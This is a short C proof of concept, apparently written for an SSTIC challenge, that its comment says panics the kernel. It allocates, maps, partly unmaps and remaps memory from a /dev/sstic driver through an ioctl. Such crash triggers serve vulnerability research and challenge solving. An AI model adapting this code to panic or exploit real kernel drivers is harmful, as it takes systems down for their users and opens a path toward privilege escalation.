/* This program panics the kernel */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>

#define BASEADDR ((void *)(0x88000000ULL))

static int sstic_alloc_region(int fd, int size, int prot) {
    int cmd[6] = { size, prot };
    if(ioctl(fd, 0xC0185300uLL, cmd) < 0) {
        printf("failed to ioctl alloc_region: %d\n", errno);
        return -1;
    }
    return cmd[2];
}

int main() {
    int fd = open("/dev/sstic", 2);
    int res;
    if(fd < 0) {
        printf("failed to open /dev/sstic\n");
        return -1;
    }

    int npages = 4; // must be a power of two
    int prot = PROT_READ | PROT_WRITE;
    int addr = sstic_alloc_region(fd, npages, prot);
    printf("region: %x\n", addr);
    uint8_t *vaddr = mmap(NULL, npages << 12, prot, MAP_SHARED, fd, addr);
    printf("mmap result: %p\n", vaddr);
    fflush(stdout);
    system("cat /proc/$PPID/maps");
    res = munmap(vaddr + 0x1000, 0x1000);
    printf("munmap result: %d\n", res);
    system("cat /proc/$PPID/maps");

    uint8_t *vaddr2 = mmap(NULL, npages << 12, prot, MAP_SHARED, fd, addr);
    system("cat /proc/$PPID/maps");
}
